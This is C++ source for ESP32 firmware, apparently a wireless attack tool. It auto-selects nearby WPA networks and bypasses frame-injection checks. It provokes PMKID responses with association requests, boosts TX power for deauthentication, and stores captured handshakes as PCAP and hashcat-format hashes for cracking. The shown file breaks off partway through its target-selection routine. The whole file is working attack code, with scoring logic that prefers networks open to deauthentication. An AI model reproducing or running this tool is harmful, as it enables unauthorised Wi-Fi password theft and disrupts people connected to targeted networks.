// YOINK Engine — Full WPA handshake capture state machine
// Ported from NEONDRIVE OINK mode for CYD ESP32
// Uses WSL Bypasser for reliable frame injection

#include "yoink_engine.h"
#include "yoink_save.h"
#include "neon_rf.h"
#include "wsl_bypasser.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <freertos/portmacro.h>

// ============= Log Ring Buffer =============
static YoinkLogEntry s_logRing[YOINK_LOG_RING_SIZE];
static volatile uint32_t s_logSeq = 0;
static volatile uint8_t  s_logHead = 0;
static uint8_t s_logCount = 0;

// Session log file on SD
static const char* YOINK_SESSION_LOG = "/yoink_session.log";
static uint32_t    s_sessionStartMs = 0;

// Registered callback (main.cpp uses this to push to consoleRing + companion)
static YoinkEngine::LogCallback s_logCb = nullptr;

// Core log function: writes to ring + SD + callback (no Serial — callers handle that)
static void logCore(uint8_t severity, const char* msg) {
    // 1. Ring buffer
    uint8_t idx = s_logHead;
    s_logRing[idx].seq = ++s_logSeq;
    s_logRing[idx].ms = millis();
    s_logRing[idx].severity = severity;
    strncpy(s_logRing[idx].msg, msg, sizeof(s_logRing[idx].msg) - 1);
    s_logRing[idx].msg[sizeof(s_logRing[idx].msg) - 1] = '\0';
    s_logHead = (s_logHead + 1) % YOINK_LOG_RING_SIZE;
    if (s_logCount < YOINK_LOG_RING_SIZE) s_logCount++;

    // 2. Append to SD session log (best-effort, don't block on failure)
    File f = SD.open(YOINK_SESSION_LOG, FILE_APPEND);
    if (f) {
        uint32_t elapsed = millis() - s_sessionStartMs;
        f.printf("[%lu.%03lu] %s\n", elapsed / 1000, elapsed % 1000, msg);
        f.close();
    }

    // 3. Registered callback (for consoleRing / companion app in main.cpp)
    if (s_logCb) s_logCb(msg);
}

// Internal engine log: adds [YOINK] prefix automatically
static void yoinkLog(uint8_t severity, const char* fmt, ...) {
    char raw[88];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(raw, sizeof(raw), fmt, ap);
    va_end(ap);

    char full[96];
    snprintf(full, sizeof(full), "[YOINK] %s", raw);

    Serial.println(full);
    logCore(severity, full);
}

// Public API: setLogCallback + logMessage
void YoinkEngine::setLogCallback(LogCallback cb) { s_logCb = cb; }

void YoinkEngine::logMessage(const char* fmt, ...) {
    char buf[96];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    int len = (int)strlen(buf);
    while (len > 0 && (buf[len-1] == '\n' || buf[len-1] == '\r')) buf[--len] = '\0';
    Serial.println(buf);
    logCore(0, buf);
}

// ============= Channel Hop Order =============
static const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t CHANNEL_COUNT = 13;

// ============= Module State =============
static bool           s_running      = false;
static YoinkState     s_state        = YoinkState::IDLE;
static uint32_t       s_stateEnterMs = 0;
static uint32_t       s_packetCount  = 0;
static uint32_t       s_deauthCount  = 0;
static uint8_t        s_currentCh    = 1;
static uint8_t        s_hopIndex     = 0;
static uint32_t       s_lastHopMs    = 0;
static uint32_t       s_lastDeauthMs = 0;
static bool           s_channelLocked = false;

// Network table
static YoinkNetwork   s_networks[YOINK_MAX_NETWORKS];
static uint8_t        s_networkCount = 0;
static portMUX_TYPE   s_netMux       = portMUX_INITIALIZER_UNLOCKED;

// Client table (for current target)
static YoinkClient    s_clients[YOINK_MAX_CLIENTS];
static uint8_t        s_clientCount  = 0;

// Handshake storage
static YoinkHandshake s_handshakes[YOINK_MAX_HANDSHAKES];
static uint8_t        s_handshakeCount = 0;

// PMKID storage
static YoinkPmkid     s_pmkids[YOINK_MAX_PMKIDS];
static uint8_t        s_pmkidCount   = 0;

// Current target
static int            s_targetIdx    = -1;
static uint8_t        s_targetBssid[6] = {0};
static char           s_targetSSID[33] = {0};
static int8_t         s_targetRSSI   = -127;

// PMKID hunting state
static uint8_t        s_pmkidHuntIdx = 0;
static uint32_t       s_pmkidHuntLastMs = 0;

// Deferred events: callback → main loop (static .bss, no heap)
#define PENDING_EAPOL_SLOTS  2
#define PENDING_BEACON_SLOTS 4
#define PENDING_CLIENT_SLOTS 8

static PendingEapolEvent  s_pendingEapol[PENDING_EAPOL_SLOTS];
static volatile uint8_t   s_pendingEapolHead = 0;

static PendingBeaconEvent s_pendingBeacon[PENDING_BEACON_SLOTS];
static volatile uint8_t   s_pendingBeaconHead = 0;

static PendingClientEvent s_pendingClient[PENDING_CLIENT_SLOTS];
static volatile uint8_t   s_pendingClientHead = 0;

// Current handshake index being tracked for the active target
static int s_activeHsIdx = -1;

// Forward declarations
static void changeState(YoinkState newState);
static void hopChannel();
static int  findNetworkByBssid(const uint8_t* bssid);
static int  findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station);
static int  selectNextTarget();
static int  computeTargetScore(const YoinkNetwork& net);
static void processBeaconEvent(const PendingBeaconEvent& ev);
static void processEapolEvent(const PendingEapolEvent& ev);
static void processClientEvent(const PendingClientEvent& ev);
static void tickScanning(uint32_t now);
static void tickPmkidHunting(uint32_t now);
static void tickNextTarget(uint32_t now);
static void tickLocking(uint32_t now);
static void tickAttacking(uint32_t now);
static void tickWaiting(uint32_t now);
static void tickBored(uint32_t now);
static void sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen);

// ============= WiFi Initialization =============

static void startWifi() {
#if defined(NEONDRIVE_TARGET_M5TAB5)
    Serial.println("[yoink] startWifi: BLOCKED on Tab5 (no local radio; C6 backend not implemented)");
    return;
#endif
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    WiFi.persistent(false);
    WiFi.setSleep(false);
    WiFi.mode(WIFI_STA);       // STA mode — NOT AP mode!
    delay(50);
    WiFi.disconnect();
    delay(50);

    // Verify WSL bypass is active (Marauder self-test pattern)
    if (WSLBypasser::isActive()) {
        yoinkLog(1, "WSL bypass: ACTIVE (magic 31337 confirmed)");
    } else {
        yoinkLog(3, "WARNING: WSL bypass NOT detected! Frame injection may fail.");
    }

    WSLBypasser::randomizeMAC();

    // Marauder-inspired: disable power save for better packet capture
    esp_wifi_set_ps(WIFI_PS_NONE);

    // Marauder-inspired: max TX power for better deauth reach
    esp_wifi_set_max_tx_power(82);  // 20.5 dBm max

    esp_wifi_set_promiscuous_rx_cb(&YoinkEngine::promiscuousCallback);
    // Accept MGMT + DATA frames (Marauder uses same filter)
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);

    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    s_currentCh = 1;

    yoinkLog(1, "WiFi ready: STA+promisc+WSL+PS_NONE+TX82");
}

static void stopWifi() {
#if defined(NEONDRIVE_TARGET_M5TAB5)
    yoinkLog(0, "stopWifi: no-op on Tab5 (local radio not active)");
    return;
#endif
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    delay(20);
    WiFi.mode(WIFI_STA);
    delay(20);
    yoinkLog(0, "WiFi stopped");
}

// ============= State Machine Helpers =============

static void changeState(YoinkState newState) {
    if (s_state == newState) return;
    const char* oldStr = YoinkEngine::getStateStr();
    s_state = newState;
    s_stateEnterMs = millis();
    yoinkLog(0, "State: %s -> %s", oldStr, YoinkEngine::getStateStr());
}

static void hopChannel() {
    if (s_channelLocked) return;
    s_hopIndex = (s_hopIndex + 1) % CHANNEL_COUNT;
    s_currentCh = CHANNEL_HOP_ORDER[s_hopIndex];
#if !defined(NEONDRIVE_TARGET_M5TAB5)
    esp_wifi_set_channel(s_currentCh, WIFI_SECOND_CHAN_NONE);
#endif
}

// ============= Network Table =============

static int findNetworkByBssid(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_networkCount; i++) {
        if (memcmp(s_networks[i].bssid, bssid, 6) == 0) return i;
    }
    return -1;
}

static int findOrAddNetwork(const uint8_t* bssid) {
    int idx = findNetworkByBssid(bssid);
    if (idx >= 0) return idx;
    if (s_networkCount >= YOINK_MAX_NETWORKS) {
        // Evict oldest (least recently seen)
        int stalest = 0;
        uint32_t oldestSeen = s_networks[0].lastSeen;
        for (uint8_t i = 1; i < s_networkCount; i++) {
            if (s_networks[i].lastSeen < oldestSeen) {
                oldestSeen = s_networks[i].lastSeen;
                stalest = i;
            }
        }
        // Move last into evicted slot
        s_networks[stalest] = s_networks[s_networkCount - 1];
        s_networkCount--;
        idx = s_networkCount;
    } else {
        idx = s_networkCount;
    }
    memset(&s_networks[idx], 0, sizeof(YoinkNetwork));
    memcpy(s_networks[idx].bssid, bssid, 6);
    s_networkCount++;
    return idx;
}

// ============= Client Table =============

static void clearClients() {
    s_clientCount = 0;
    memset(s_clients, 0, sizeof(s_clients));
}

static void trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    // Only track for current target
    if (memcmp(bssid, s_targetBssid, 6) != 0) return;
    // Ignore multicast/broadcast
    if (clientMac[0] & 0x01) return;

    uint32_t now = millis();

    // Update existing
    for (uint8_t i = 0; i < s_clientCount; i++) {
        if (memcmp(s_clients[i].mac, clientMac, 6) == 0) {
            s_clients[i].rssi = rssi;
            s_clients[i].lastSeen = now;
            return;
        }
    }

    // LRU eviction
    if (s_clientCount >= YOINK_MAX_CLIENTS) {
        int stalest = 0;
        uint32_t oldest = s_clients[0].lastSeen;
        for (uint8_t i = 1; i < s_clientCount; i++) {
            if (s_clients[i].lastSeen < oldest) {
                oldest = s_clients[i].lastSeen;
                stalest = i;
            }
        }
        if (now - oldest > 30000) {
            s_clients[stalest] = s_clients[s_clientCount - 1];
            s_clientCount--;
        } else {
            return;  // All fresh, can't add
        }
    }

    memcpy(s_clients[s_clientCount].mac, clientMac, 6);
    s_clients[s_clientCount].rssi = rssi;
    s_clients[s_clientCount].lastSeen = now;
    s_clientCount++;
}

// ============= Handshake Table =============

static int findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station) {
    // Find existing
    for (uint8_t i = 0; i < s_handshakeCount; i++) {
        if (memcmp(s_handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(s_handshakes[i].station, station, 6) == 0) {
            return i;
        }
    }
    // Table not full yet - add new slot
    if (s_handshakeCount < YOINK_MAX_HANDSHAKES) {
        int idx = s_handshakeCount;
        memset(&s_handshakes[idx], 0, sizeof(YoinkHandshake));
        memcpy(s_handshakes[idx].bssid, bssid, 6);
        memcpy(s_handshakes[idx].station, station, 6);
        s_handshakes[idx].firstSeen = millis();

        int netIdx = findNetworkByBssid(bssid);
        if (netIdx >= 0) {
            strncpy(s_handshakes[idx].ssid, s_networks[netIdx].ssid, 32);
            s_handshakes[idx].ssid[32] = 0;
        }

        s_handshakeCount++;
        return idx;
    }

    // Table full - recycle oldest SAVED entry to make room
    int recycleIdx = -1;
    uint32_t oldestSeen = UINT32_MAX;
    for (uint8_t i = 0; i < s_handshakeCount; i++) {
        if (s_handshakes[i].saved && s_handshakes[i].lastSeen < oldestSeen) {
            oldestSeen = s_handshakes[i].lastSeen;
            recycleIdx = i;
        }
    }
    if (recycleIdx < 0) {
        // No saved entries to recycle - find oldest incomplete
        for (uint8_t i = 0; i < s_handshakeCount; i++) {
            if (s_handshakes[i].lastSeen < oldestSeen) {
                oldestSeen = s_handshakes[i].lastSeen;
                recycleIdx = i;
            }
        }
    }
    if (recycleIdx < 0) return -1;  // shouldn't happen

    yoinkLog(0, "Recycled HS slot %d (was %s)", recycleIdx, s_handshakes[recycleIdx].ssid);
    if (s_activeHsIdx == recycleIdx) s_activeHsIdx = -1;

    memset(&s_handshakes[recycleIdx], 0, sizeof(YoinkHandshake));
    memcpy(s_handshakes[recycleIdx].bssid, bssid, 6);
    memcpy(s_handshakes[recycleIdx].station, station, 6);
    s_handshakes[recycleIdx].firstSeen = millis();

    int netIdx = findNetworkByBssid(bssid);
    if (netIdx >= 0) {
        strncpy(s_handshakes[recycleIdx].ssid, s_networks[netIdx].ssid, 32);
        s_handshakes[recycleIdx].ssid[32] = 0;
    }

    return recycleIdx;
}

// ============= Target Selection =============

static int computeTargetScore(const YoinkNetwork& net) {
    int score = 0;
    uint32_t now = millis();

    // RSSI weight (0-60 pts)
    int rssi = net.rssiAvg != 0 ? net.rssiAvg : net.rssi;
    if (rssi > -40) score += 60;       // Very close
    else if (rssi > -55) score += 45;
    else if (rssi > -65) score += 30;
    else if (rssi > -75) score += 15;
    else score += 5;

    // Proximity bonus
    if (rssi > -40) score += 25;

    // Client activity (recent data frames)
    if (net.lastDataSeen > 0 && now - net.lastDataSeen < 10000) {
        score += 30;
    }

    // Estimated clients
    if (net.estimatedClients > 3) score += 16;
    else if (net.estimatedClients > 0) score += 6;

    // Auth mode preference
    if (net.authmode == WIFI_AUTH_WEP) score += 15;
    else if (net.authmode == WIFI_AUTH_WPA_PSK) score += 10;
    // WPA2 = baseline, WPA3 = penalty
#if defined(WIFI_AUTH_WPA3_PSK)
    if (net.authmode == WIFI_AUTH_WPA3_PSK) score -= 10;
#endif

    // Attack attempts penalty
    score -= net.attackAttempts * 8;

    // Already-captured penalty: still targetable but lower priority than fresh networks
    score -= (int)net.captureCount * 30;

    return score;
}

static int selectNextTarget() {
    int bestIdx = -1;
    int bestScore = -999;
    uint32_t now = millis();

    for (uint8_t i = 0; i < s_networkCount; i++) {
        const YoinkNetwork& net = s_networks[i];

        // Eligibility filters
        if (net.hasPMF) continue;                    // Can't deauth PMF networks
        if (net.cooldownUntil > now) continue;       // On cooldown
        if (net.authmode == WIFI_AUTH_OPEN) continue; // Open networks have no handshake
        if (net.ssid[0] == 0) continue;              // Hidden (no SSID)
        if (net.rssi < -80) continue;                // Too weak

        int score = computeTargetScore(net);
        if (score > bestScore) {
            bestScore = score;
            bestIdx = i;
        }
    }

    return bestIdx;
}

// ============= PROMISCUOUS CALLBACK =============
// This runs in the WiFi task context (NOT the Arduino loop).
// MUST NOT allocate heap memory. Writes to static deferred event buffers.

namespace YoinkEngine {

void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_running || !buf) return;

    wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = ppkt->payload;
    uint16_t len = ppkt->rx_ctrl.sig_len;
    int8_t rssi = ppkt->rx_ctrl.rssi;

    if (!payload || len < 24) return;

    s_packetCount++;

    uint8_t fc0 = payload[0];
    uint8_t fc1 = payload[1];
    uint8_t frameType = (fc0 >> 2) & 0x03;
    uint8_t subtype = (fc0 >> 4) & 0x0F;

    // --- MANAGEMENT FRAMES ---
    if (frameType == 0) {
        if (subtype == 8) {
            // BEACON — extract AP info and defer to main loop
            uint8_t slot = s_pendingBeaconHead;
            PendingBeaconEvent& ev = s_pendingBeacon[slot];
            if (!ev.pending) {
                memcpy(ev.bssid, payload + 10, 6);  // Addr2 = SA = BSSID
                ev.channel = ppkt->rx_ctrl.channel;
                ev.rssi = rssi;
                ev.isHidden = false;
                ev.hasPMF = false;
                ev.ssid[0] = 0;
                ev.authmode = WIFI_AUTH_OPEN;

                // Parse tagged parameters for SSID & RSN
                if (len > 36) {
                    const uint8_t* tags = payload + 36;  // Fixed params (12) + header (24)
                    uint16_t tagsLen = len - 36;

                    uint16_t pos = 0;
                    while (pos + 2 <= tagsLen) {
                        uint8_t tagId = tags[pos];
                        uint8_t tagLen = tags[pos + 1];
                        if (pos + 2 + tagLen > tagsLen) break;

                        if (tagId == 0) {
                            // SSID IE
                            if (tagLen == 0 || tags[pos + 2] == 0) {
                                ev.isHidden = true;
                            } else {
                                uint8_t copyLen = tagLen > 32 ? 32 : tagLen;
                                memcpy(ev.ssid, tags + pos + 2, copyLen);
                                ev.ssid[copyLen] = 0;
                            }
                        } else if (tagId == 48) {
                            // RSN IE — parse for auth mode + PMF
                            ev.authmode = WIFI_AUTH_WPA2_PSK;  // Has RSN = at least WPA2

                            // Check RSN capabilities for PMF (MFPC/MFPR bits)
                            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2)
                            // + pairwise ciphers + AKM count(2) + AKM suites + RSN Caps(2)
                            if (tagLen >= 2) {
                                // Try to find RSN capabilities field
                                uint16_t rsnPos = 2;  // skip version
                                if (rsnPos + 4 <= tagLen) rsnPos += 4;  // skip group cipher
                                if (rsnPos + 2 <= tagLen) {
                                    uint16_t pwCount = tags[pos + 2 + rsnPos] |
                                                       (tags[pos + 2 + rsnPos + 1] << 8);
                                    rsnPos += 2 + pwCount * 4;  // skip pairwise ciphers
                                }
                                if (rsnPos + 2 <= tagLen) {
                                    uint16_t akmCount = tags[pos + 2 + rsnPos] |
                                                        (tags[pos + 2 + rsnPos + 1] << 8);
                                    // Check AKM suites for SAE (WPA3)
                                    for (uint16_t a = 0; a < akmCount && rsnPos + 2 + (a + 1) * 4 <= tagLen; a++) {
                                        uint8_t akmType = tags[pos + 2 + rsnPos + 2 + a * 4 + 3];
                                        if (akmType == 8) {
                                            // SAE = WPA3
#if defined(WIFI_AUTH_WPA3_PSK)
                                            ev.authmode = WIFI_AUTH_WPA3_PSK;
#endif
                                        }
                                    }
                                    rsnPos += 2 + akmCount * 4;
                                }
                                // RSN capabilities
                                if (rsnPos + 2 <= tagLen) {
                                    uint16_t rsnCaps = tags[pos + 2 + rsnPos] |
                                                       (tags[pos + 2 + rsnPos + 1] << 8);
                                    bool mfpc = rsnCaps & 0x0080;  // Bit 7: MFPC
                                    bool mfpr = rsnCaps & 0x0040;  // Bit 6: MFPR
                                    ev.hasPMF = mfpr;  // Required = immune to deauth
                                    (void)mfpc;
                                }
                            }
                        }
                        pos += 2 + tagLen;
                    }
                }

                // Save raw beacon frame for PCAP
                uint16_t copyLen = len > 256 ? 256 : len;
                memcpy(ev.frameData, payload, copyLen);
                ev.frameLen = copyLen;

                ev.pending = true;
                s_pendingBeaconHead = (slot + 1) % PENDING_BEACON_SLOTS;
            }
        }
    }

    // --- DATA FRAMES ---
    if (frameType == 2) {
        uint8_t toDs = fc1 & 0x01;
        uint8_t fromDs = (fc1 & 0x02) >> 1;

        const uint8_t* bssid = nullptr;
        const uint8_t* client = nullptr;

        if (!toDs && fromDs) {         // From AP to client
            bssid = payload + 10;      // Addr2 = BSSID
            client = payload + 4;      // Addr1 = client DA
        } else if (toDs && !fromDs) {  // From client to AP
            bssid = payload + 4;       // Addr1 = BSSID
            client = payload + 10;     // Addr2 = client SA
        }

        if (bssid && client) {
            // Defer client tracking
            uint8_t cslot = s_pendingClientHead;
            PendingClientEvent& cev = s_pendingClient[cslot];
            if (!cev.pending) {
                memcpy(cev.bssid, bssid, 6);
                memcpy(cev.clientMac, client, 6);
                cev.rssi = rssi;
                cev.pending = true;
                s_pendingClientHead = (cslot + 1) % PENDING_CLIENT_SLOTS;
            }
        }

        // --- Check for EAPOL (LLC/SNAP: AA AA 03 00 00 00 88 8E) ---
        if (bssid && client && len > 32) {
            // Calculate data offset (skip QoS + HTC if present)
            uint16_t dataOffset = 24;
            bool isQoS = (subtype & 0x08) != 0;
            if (isQoS) dataOffset += 2;
            bool hasHTC = (fc1 & 0x80) != 0;  // Order bit
            if (hasHTC) dataOffset += 4;

            if (dataOffset + 8 <= len) {
                const uint8_t* llc = payload + dataOffset;
                // Check LLC/SNAP header for EAPOL (ethertype 0x888E)
                if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
                    llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
                    llc[6] == 0x88 && llc[7] == 0x8E) {

                    const uint8_t* eapolStart = llc + 8;
                    uint16_t eapolLen = len - (dataOffset + 8);
                    if (eapolLen > 512) eapolLen = 512;

                    // Classify EAPOL message (M1-M4) using Key Info flags
                    // EAPOL-Key: version(1) + type(1) + length(2) + descriptor(1) + keyinfo(2)
                    if (eapolLen >= 7) {
                        uint16_t keyInfo = ((uint16_t)eapolStart[5] << 8) | eapolStart[6];
                        bool keyAck = (keyInfo & 0x0080) != 0;
                        bool keyMic = (keyInfo & 0x0100) != 0;
                        bool install = (keyInfo & 0x0040) != 0;
                        bool secure  = (keyInfo & 0x0200) != 0;

                        uint8_t msgNum = 0;
                        if (keyAck && !keyMic && !install)  msgNum = 1;  // M1: AP→STA, Ack, no MIC
                        else if (!keyAck && keyMic && !install) msgNum = 2;  // M2: STA→AP, MIC, no Ack
                        else if (keyAck && keyMic && install)   msgNum = 3;  // M3: AP→STA, Ack+MIC+Install
                        else if (!keyAck && keyMic && secure)   msgNum = 4;  // M4: STA→AP, MIC+Secure

                        if (msgNum > 0) {
                            // Defer to main loop
                            uint8_t eslot = s_pendingEapolHead;
                            PendingEapolEvent& eev = s_pendingEapol[eslot];
                            if (!eev.pending) {
                                memcpy(eev.bssid, bssid, 6);
                                memcpy(eev.station, client, 6);
                                memcpy(eev.eapolData, eapolStart, eapolLen);
                                eev.eapolLen = eapolLen;

                                // Full frame for PCAP (up to 200 bytes)
                                uint16_t frameCopy = len > 200 ? 200 : len;
                                memcpy(eev.fullFrame, payload, frameCopy);
                                eev.fullFrameLen = frameCopy;

                                eev.messageNum = msgNum;
                                eev.rssi = rssi;
                                eev.timestamp = millis();

                                // Check M1 for PMKID KDE (dd 14 00 0f ac 04)
                                eev.hasPmkid = false;
                                if (msgNum == 1 && eapolLen >= 99) {
                                    // Key Data starts after Key Data Length field
                                    // EAPOL-Key header: 4+1+2+8+32+16+8+8+2 = 81 bytes to Key MIC
                                    // Then 16 bytes MIC, 2 bytes Key Data Length
                                    uint16_t keyDataLen = ((uint16_t)eapolStart[97] << 8) | eapolStart[98];
                                    uint16_t keyDataStart = 99;

                                    if (keyDataStart + keyDataLen <= eapolLen && keyDataLen >= 22) {
                                        // Search for PMKID KDE: dd 14 00 0f ac 04
                                        for (uint16_t p = keyDataStart; p + 22 <= keyDataStart + keyDataLen; p++) {
                                            if (eapolStart[p] == 0xDD && eapolStart[p + 1] == 0x14 &&
                                                eapolStart[p + 2] == 0x00 && eapolStart[p + 3] == 0x0F &&
                                                eapolStart[p + 4] == 0xAC && eapolStart[p + 5] == 0x04) {
                                                memcpy(eev.pmkid, eapolStart + p + 6, 16);
                                                eev.hasPmkid = true;
                                                break;
                                            }
                                        }
                                    }
                                }

                                eev.pending = true;
                                s_pendingEapolHead = (eslot + 1) % PENDING_EAPOL_SLOTS;
                            }
                        }
                    }
                }
            }
        }
    }
}

}  // namespace YoinkEngine (callback)

// ============= Deferred Event Processing (main loop) =============

static void processBeaconEvent(const PendingBeaconEvent& ev) {
    portENTER_CRITICAL(&s_netMux);
    int idx = findOrAddNetwork(ev.bssid);
    portEXIT_CRITICAL(&s_netMux);

    if (idx < 0) return;
    YoinkNetwork& net = s_networks[idx];

    uint32_t now = millis();
    net.lastSeen = now;
    net.beaconCount++;
    net.channel = ev.channel;
    net.authmode = ev.authmode;
    net.hasPMF = ev.hasPMF;
    net.isHidden = ev.isHidden;

    if (ev.ssid[0] != 0) {
        strncpy(net.ssid, ev.ssid, 32);
        net.ssid[32] = 0;
    }

    // Update RSSI EMA
    if (net.rssiAvg == 0) {
        net.rssiAvg = ev.rssi;
    } else {
        net.rssiAvg = (int8_t)(((int)net.rssiAvg * 7 + (int)ev.rssi) / 8);
    }
    net.rssi = ev.rssi;

    // Update beacon in active handshake (for PCAP output)
    if (s_activeHsIdx >= 0 && s_activeHsIdx < s_handshakeCount) {
        if (memcmp(s_handshakes[s_activeHsIdx].bssid, ev.bssid, 6) == 0) {
            if (s_handshakes[s_activeHsIdx].beaconLen == 0 && ev.frameLen > 0) {
                uint16_t copyLen = ev.frameLen > 256 ? 256 : ev.frameLen;
                memcpy(s_handshakes[s_activeHsIdx].beaconData, ev.frameData, copyLen);
                s_handshakes[s_activeHsIdx].beaconLen = copyLen;
            }
        }
    }
}

static void processEapolEvent(const PendingEapolEvent& ev) {
    uint8_t msgIdx = ev.messageNum - 1;  // 0-based
    if (msgIdx > 3) return;

    yoinkLog(1, "EAPOL M%d! BSSID=%02X:%02X:%02X:%02X:%02X:%02X STA=%02X:%02X:%02X:%02X:%02X:%02X RSSI=%d",
             ev.messageNum,
             ev.bssid[0], ev.bssid[1], ev.bssid[2],
             ev.bssid[3], ev.bssid[4], ev.bssid[5],
             ev.station[0], ev.station[1], ev.station[2],
             ev.station[3], ev.station[4], ev.station[5],
             ev.rssi);

    int hsIdx = findOrCreateHandshake(ev.bssid, ev.station);
    if (hsIdx < 0) {
        yoinkLog(2, "Handshake table full - no recyclable slots");
        return;
    }

    YoinkHandshake& hs = s_handshakes[hsIdx];
    s_activeHsIdx = hsIdx;

    // Store the frame (don't overwrite if already captured, unless this one has better RSSI)
    if (!(hs.capturedMask & (1 << msgIdx)) ||
        ev.rssi > hs.frames[msgIdx].rssi) {
        memcpy(hs.frames[msgIdx].eapolData, ev.eapolData, ev.eapolLen);
        hs.frames[msgIdx].eapolLen = ev.eapolLen;
        memcpy(hs.frames[msgIdx].fullFrame, ev.fullFrame, ev.fullFrameLen);
        hs.frames[msgIdx].fullFrameLen = ev.fullFrameLen;
        hs.frames[msgIdx].timestamp = ev.timestamp;
        hs.frames[msgIdx].rssi = ev.rssi;
        hs.capturedMask |= (1 << msgIdx);
        hs.lastSeen = ev.timestamp;
    }

    // Check if we have a valid pair now
    if (hs.hasValidPair() && !hs.saved) {
        yoinkLog(1, "*** HANDSHAKE COMPLETE *** %s (mask=0x%02X pair=%d)",
                hs.ssid, hs.capturedMask, hs.getMessagePair());

        // Save to SD
        bool pcapOk = YoinkSave::saveHandshakePcap(hs);
        bool hashOk = YoinkSave::saveHandshake22000(hs);
        hs.saved = (pcapOk || hashOk);

        if (hs.saved) {
            // Mark network as captured and increment its capture count
            int netIdx = findNetworkByBssid(ev.bssid);
            if (netIdx >= 0) {
                s_networks[netIdx].hasHandshake = true;
                s_networks[netIdx].captureCount++;
                // Pre-set captureSeq for the next handshake from this AP
                uint8_t nextSeq = s_networks[netIdx].captureCount;

                yoinkLog(1, "HS #%u from %s saved, slot recycled for re-capture",
                         s_networks[netIdx].captureCount, hs.ssid);

                // Reset the slot so it can collect new EAPOL frames immediately.
                // Keep bssid/ssid/beaconData so context is preserved.
                hs.capturedMask = 0;
                hs.saved = false;
                hs.firstSeen = 0;
                hs.lastSeen  = 0;
                memset(hs.frames, 0, sizeof(hs.frames));
                hs.captureSeq = nextSeq;  // filename seq for the upcoming capture
            }
        }
    }

    // Handle PMKID from M1
    if (ev.hasPmkid) {
        yoinkLog(1, "PMKID found in M1!");

        if (s_pmkidCount < YOINK_MAX_PMKIDS) {
            YoinkPmkid& pmk = s_pmkids[s_pmkidCount];
            memcpy(pmk.bssid, ev.bssid, 6);
            memcpy(pmk.station, ev.station, 6);
            memcpy(pmk.pmkid, ev.pmkid, 16);
            pmk.timestamp = ev.timestamp;
            pmk.saved = false;

            // Copy SSID from network table
            int netIdx = findNetworkByBssid(ev.bssid);
            if (netIdx >= 0) {
                strncpy(pmk.ssid, s_networks[netIdx].ssid, 32);
                pmk.ssid[32] = 0;
            }

            // Save immediately
            if (YoinkSave::savePmkid22000(pmk)) {
                pmk.saved = true;
                if (netIdx >= 0) s_networks[netIdx].hasHandshake = true;
            }

            s_pmkidCount++;
        }
    }
}

static void processClientEvent(const PendingClientEvent& ev) {
    trackClient(ev.bssid, ev.clientMac, ev.rssi);

    // Update lastDataSeen on the network
    int netIdx = findNetworkByBssid(ev.bssid);
    if (netIdx >= 0) {
        s_networks[netIdx].lastDataSeen = millis();
        // Simple client count heuristic
        if (memcmp(ev.bssid, s_targetBssid, 6) == 0) {
            s_networks[netIdx].estimatedClients = s_clientCount;
        }
    }
}

// ============= State Machine Ticks =============

static void tickScanning(uint32_t now) {
    // Channel hop during scan
    if (now - s_lastHopMs >= YOINK_CHANNEL_HOP_MS) {
        hopChannel();
        s_lastHopMs = now;
    }

    // After scan duration, try PMKID hunt, then target selection
    if (now - s_stateEnterMs >= YOINK_SCAN_DURATION) {
        if (s_networkCount > 0) {
            changeState(YoinkState::PMKID_HUNTING);
            s_pmkidHuntIdx = 0;
            s_pmkidHuntLastMs = now;
        } else {
            changeState(YoinkState::BORED);
        }
    }
}

static void tickPmkidHunting(uint32_t now) {
    // Cycle through WPA2+ networks, sending assoc requests to provoke M1
    if (now - s_pmkidHuntLastMs >= 2000) {
        s_pmkidHuntLastMs = now;

        // Find next WPA2+ network
        while (s_pmkidHuntIdx < s_networkCount) {
            YoinkNetwork& net = s_networks[s_pmkidHuntIdx];
            s_pmkidHuntIdx++;

            if (net.authmode < WIFI_AUTH_WPA2_PSK) continue;
            if (net.hasPMF) continue;
            if (net.hasHandshake) continue;
            if (net.ssid[0] == 0) continue;

            // Lock to network's channel and send assoc request
            s_channelLocked = true;
            s_currentCh = net.channel;
            esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
            sendAssociationRequest(net.bssid, net.ssid, strlen(net.ssid));
            yoinkLog(0, "PMKID hunt: assoc -> %s ch%d", net.ssid, net.channel);
            s_channelLocked = false;
            return;
        }

        // Done hunting
        changeState(YoinkState::NEXT_TARGET);
    }

    if (now - s_stateEnterMs >= YOINK_PMKID_HUNT_MAX) {
        changeState(YoinkState::NEXT_TARGET);
    }
}

static void tickNextTarget(uint32_t now) {
    int idx = selectNextTarget();
    if (idx < 0) {
        yoinkLog(2, "No eligible targets");
        changeState(YoinkState::BORED);
        return;
    }

    s_targetIdx = idx;
    memcpy(s_targetBssid, s_networks[idx].bssid, 6);
    strncpy(s_targetSSID, s_networks[idx].ssid, 32);
    s_targetSSID[32] = 0;
    s_targetRSSI = s_networks[idx].rssi;
    clearClients();

    // Lock channel
    s_channelLocked = true;
